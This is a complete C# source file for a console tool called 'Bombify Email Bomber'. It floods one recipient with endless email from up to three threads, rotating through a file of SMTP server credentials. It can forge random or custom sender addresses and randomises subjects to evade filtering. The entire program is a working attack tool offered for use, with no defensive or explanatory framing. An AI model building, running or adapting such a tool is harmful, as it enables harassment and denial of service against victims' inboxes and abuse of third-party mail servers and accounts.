﻿using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace Bombify_Email_Bomber
{
    class Program
    {
        static void Main(string[] args)
        {
            // Loading screen
            Console.WriteLine("Loading Bombify Email Bomber...");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("(Made by Kevin AKA WeedmasterOG)");
            Thread.Sleep(2500);
            Console.ResetColor();

            // Show success or not message
            bool SuccessMessgae = false;

            // Check network connectivity
            CheckNetworkTryAgain:

            try
            {
                // Try to connect to google
                using (var Wc = new WebClient())
                {
                    using (var stream = Wc.OpenRead("https://www.google.com"))
                    {

                    }
                }
            }
            catch
            {
                SuccessMessgae = true;

                // Show network error message
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: An active network connection is needed for this program to work, retrying in 10 seconds");
                Thread.Sleep(10000);

                // Show retry message
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Retrying...");

                // Retry
                goto CheckNetworkTryAgain;
            }

            // Show success message
            if (SuccessMessgae == true)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Success!");
                Thread.Sleep(1000);
            }

            Console.Clear();
            Console.ResetColor();

            // Get user input
            UserInput.GetSmtpInput();
            UserInput.GetModeInput();
            UserInput.GetSenderInput();

            // Check if mode's value is 1
            if (Variables.Mode == 1)
            {
                // Get user input
                UserInput.GetTitleInput();
                UserInput.GetBodyInput();
            }

            // Get user input
            UserInput.GetToInput();
            UserInput.GetSslInput();
            UserInput.GetThreadCount();

            // Get contents of txt file, put then into an array
            string Line;
            int Count = 0;

            StreamReader file = new StreamReader(Variables.SmtpListPath);
            while ((Line = file.ReadLine()) != null)
            {
                Variables.SmtpList[Count] = Line;
                Count++;
            }

            file.Close();

            // Get line count
            Variables.LineCount = File.ReadLines(Variables.SmtpListPath).Count();

            // Display text
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("BOMBER STARTED, Press any key to exit!\n");
            Thread.Sleep(1500);

            // Declair threads
            Thread thread1 = new Thread(Thread1);
            Thread thread2 = new Thread(Thread2);
            Thread thread3 = new Thread(Thread3);

            // Start threads
            switch(Variables.ThreadCount)
            {
                case 1:
                    thread1.Start();
                    break;
                case 2:
                    thread1.Start();
                    thread2.Start();
                    break;
                case 3:
                    thread1.Start();
                    thread2.Start();
                    thread3.Start();
                    break;
            }

            // Wait for usr abort
            Console.ReadLine();
                
            // Kill all threads
            if (thread1.IsAlive == true)
            {
                thread1.Abort();
            } else if (thread2.IsAlive == true)
            {
                thread2.Abort();
            } else if (thread3.IsAlive == true)
            {
                thread3.Abort();
            }

            // Exit
            Environment.Exit(0);
        }

        // Thread 1
        public static void Thread1()
        {
            // Lines variable
            int Lines;

            // Infinite loop
            while (true)
            {
                // Choose what smtp server to use
                Lines = random.Next(0, Variables.LineCount);

                // Send email
                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
            }
        }

        // Thread 2
        public static void Thread2()
        {
            // Lines variable
            int Lines;

            // Infinite loop
            while (true)
            {
                // Choose what smtp server to use
                Lines = random.Next(0, Variables.LineCount);

                // Send email
                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
            }
        }

        // Thread 3
        public static void Thread3()
        {
            // Lines variable
            int Lines;

            // Infinite loop
            while (true)
            {
                // Choose what smtp server to use
                Lines = random.Next(0, Variables.LineCount);

                // Send email
                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
            }
        }

        // SendMail method
        public static void SendEmail(string Domain, int Port, string Username, string Password)
        {
            // Create new instance
            using (MailMessage Mail = new MailMessage())
            {
                // Add to
                Mail.To.Add(Variables.To);

                // Check if user wants a customer sender
                if (Variables.Sender == "None")
                {
                    // Add default sender
                    Mail.From = new MailAddress(Username);
                }
                else if (Variables.Sender == "rand")
                {
                    // Add random sender
                    Mail.From = new MailAddress(RandomString(true, 12) + "@" + RandomString(true, 6) + "." + RandomString(true, 3));
                }
                else
                {
                    // Add custom sender
                    Mail.From = new MailAddress(Variables.Sender);
                }

                // Create new smtpclient instance
                using (SmtpClient Smtp = new SmtpClient(Domain, Port))
                {
                    Smtp.Timeout = 5000;

                    // Check if user wants ssl or not
                    if (Variables.Ssl == 1)
                    {
                        // Use ssl
                        Smtp.EnableSsl = true;
                    }
                    else
                    {
                        // Dont use ssl
                        Smtp.EnableSsl = false;
                    }

                    // Choose credentials
                    Smtp.Credentials = new NetworkCredential(Username, Password);

                    // Check if mode's value is 1
                    if (Variables.Mode == 1)
                    {
                        // Add title and body
                        Mail.Subject = Variables.Title + " " + RandomString(false, 8);
                        Mail.Body = Variables.Body;
                    }
                    else
                    {
                        // Add random title and body
                        Mail.Subject = RandomString(true, 64);
                        Mail.Body = RandomString(true, 64);
                    }

                    // Handle errors while sending email
                    try
                    {
                        // Send email
                        Smtp.Send(Mail);

                        // Display text
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Email sent (" + Domain + ", " + Username + ")");
                    }
                    catch
                    {
                        // Show error message
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Error sending email with " + "(" + Domain + ", " + Username + ")");
                    }
                }
            }
        }

        // Declair new instance
        private static Random random = new Random();

        // SmtpCreds method
        public static string SmtpCreds(int Section, int Line)
        {
            // return value
            return Variables.SmtpList[Line].Split(':')[Section];
        }

        // RandomString method
        public static string RandomString(bool RandomType, int length)
        {
            if (RandomType == true)
            {
                // Set characters
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                // Generate random string
                return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
            } else
            {
                // Set characters
                const string chars = "₀₁₂₃₄₅₆";

                // Generate random string
                return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
            }
        }
    }
}